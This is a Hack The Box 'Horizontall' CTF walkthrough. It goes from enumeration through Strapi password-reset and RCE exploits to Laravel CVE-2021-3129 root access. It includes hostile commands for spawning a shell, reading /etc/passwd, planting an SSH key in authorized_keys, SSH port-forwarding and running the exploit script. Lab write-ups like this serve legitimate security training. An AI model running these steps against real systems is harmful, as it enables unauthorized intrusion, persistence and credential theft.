# HTB Horizontall

### Enumeration
As with most, if not all htb machines, we add horizontall.htb to the hosts file on the attacking machine.

![Step 0](screenshots/hosts-file.png "Setup hosts file")

Initial scan with nmap shows ports 22, 80, 8082 and 8085 are open.

` nmap -Pn -p- -vv -sS -A -oA all-ports horizontall.htb`

![Step 1](screenshots/nmap-scan.png "Nmap Scan")

Check out the site on port 80. Notice that none of the clickable content works.
Look at the javascript that loads the page.

![Step 2](screenshots/subdomain-1.png "Finding a Subdomain 1")

On one of the javascript pages, a subdomain is found
(http://api-prod.horinzall.htb/review).

![Step 3](screenshots/subdomain-2.png "Finding a Subdomain 2")

Add this subdomain to hosts file for easy access.

![Step 4](screenshots/edit-hosts-file.png "Finding a Subdomain 3")

From here, a json payload can be found at http://api-prod.horinzall.htb/review.
Dirb leads to an admin page for a strapi web application.
A quick search at exploit-db.com shows 2 exploits for strapi.
The [first](
https://www.exploit-db.com/exploits/50237 
"50237") exploit allows an attacker to get unauthenticated access.
The [second](
https://www.exploit-db.com/exploits/50238 
"50238") exploit allows an attacker to use authenticated access to remotely execute code.
To use the first exploit, the attacker will need a valid email address.
Unfortunately for strapi, a valid email can be bruteforced using the "Forget Email" function.
When an invalid email is provided, a warning message appears telling the attacker it doesn't exist.
If a valid email is provided, no warning appears.

![Step 5.1](screenshots/email-validation-1.png "Email Validation 1")
![Step 5.2](screenshots/email-validation-2.png "Email Validation 2")

Using admin@horizontall.htb, an attacker is able to leverage the The [first](
https://www.exploit-db.com/exploits/50237 
"50237") exploit to change the password and login.

![Step 6](screenshots/admin-login.png "Admin Page Login")


### Foothold

For the [second](
https://www.exploit-db.com/exploits/50238 
"50238") exploit, the attacker just needs the Bearer token from an authenticated session.

![Step 7](screenshots/bearer-authorization-token.png "Bearer Token")

Use `/bin/sh` as the command in second exploit to get a shell.
To upgrade access to tty, use python `python -c 'import pty; pty.spawn("/bin/bash")'`.

NOTE: I have modified the exploit so that I can have netcat open in a second terminal to help with viewing.

![Step 8](screenshots/strapi-rce.png "Second Exploit")


### User Flag

Check for local users `cat /etc/passwd`.

![Step 9](screenshots/passwd.png "Check passwd File")

Check user developer's home directory for the flag.

![Step 10](screenshots/user-flag.png "User Flag")

### Root

The attacker is able to find some credentials in `/opt/strapi/myapi/config/environments/development/database.json`
to the mysql database.
There are some configurations stored in the database.
Some configurations point locally to port 1337.
Check netstat for any other interesting ports to show themselves.

![Step 11](screenshots/netstat.png "Netstat")

Use `curl` to check out ports 1337 and 8000.
Port 8000 some code for returns Laravel v8.
There is an RCE (Remote Code Execution) exploit possibility [here](
https://github.com/khanhnv-2091/laravel-8.4.2-rce 
"laravel-8.4.2-rce").

NOTE: The exploit will pull a different git repo to craft the payload being used.
Because of this, the attacker will have to create a port forwarding SSH tunnel from the attacker to the victim.

Create an SSH key on the victim and allow access without using a password:
```
mkdir ~/.ssh
ssh-keygen
echo $(cat /opt/strapi/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys
cat id_rsa
```

Use the id_rsa key on the attacking host and execute the second exploit.
```
nano id_rsa  # Drop in the whole id_rsa key and save.
chmod 600 id_rsa
ssh -i id_rsa -L 8000:127.0.0.1:8000 strapi@horizontall.htb
git clone https://github.com/nth347/CVE-2021-3129_exploit
cd CVE-2021-3129_exploit
chmod +x exploit.py
./exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"
```

SSH NOTE: The following is opening port 8000 locally on the attacking host.
All traffic directed to port 8000 on the attacking host will go through the SSH tunnel to 127.0.0.1 port 8000 on the victim.

![Step 12](screenshots/root-flag.png "Root Flag")